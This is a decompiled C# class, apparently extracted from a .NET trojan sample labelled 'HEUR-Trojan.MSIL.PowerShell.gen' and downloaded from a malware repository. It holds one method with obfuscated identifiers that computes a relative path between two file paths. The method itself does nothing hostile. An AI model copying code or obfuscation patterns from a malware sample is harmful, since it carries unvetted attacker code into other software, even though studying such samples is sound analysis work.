// Decompiled with JetBrains decompiler
// Type: s914340524944514.s911475239031384
// Assembly: s968508024776124, Version=2.0.47.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: E3596912-35E7-405B-A05A-F5F12AB5E292
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan.MSIL.PowerShell.gen-b1729c7ae8423cc844b16aa10ca8ddd2b2331adbfb6646d80d73381fbc73a109.exe

using System.IO;

namespace s914340524944514
{
  internal static class s911475239031384
  {
    public static string s655637727658535(string s399318369089827, string s818408174087116)
    {
      string fullPath1 = Path.GetFullPath(s399318369089827);
      string fullPath2 = Path.GetFullPath(s818408174087116);
      int num1 = -1;
      for (int index = 0; index < fullPath1.Length; ++index)
      {
        char c1 = fullPath1[index];
        if (index >= fullPath2.Length)
        {
          if (c1 == '\\')
          {
            num1 = index;
            break;
          }
          break;
        }
        char c2 = fullPath2[index];
        if ((int) c2 != (int) c1)
        {
          if (char.IsLower(c2))
            c2 -= ' ';
          if (char.IsLower(c1))
            c1 -= ' ';
          if ((int) c2 != (int) c1)
            break;
        }
        if (c2 == '\\')
          num1 = index;
      }
      if (num1 < 0)
        return s399318369089827;
      string path1 = "";
      int num2 = num1;
      while (num2 < fullPath2.Length)
      {
        if (path1.Length > 0)
          path1 += "\\";
        path1 += "..";
        if (num2 + 1 != fullPath2.Length)
        {
          num2 = fullPath2.IndexOf('\\', num2 + 1);
          if (num2 < 0)
            break;
        }
        else
          break;
      }
      string path2 = fullPath1.Substring(num1 + 1);
      return Path.Combine(path1, path2);
    }
  }
}
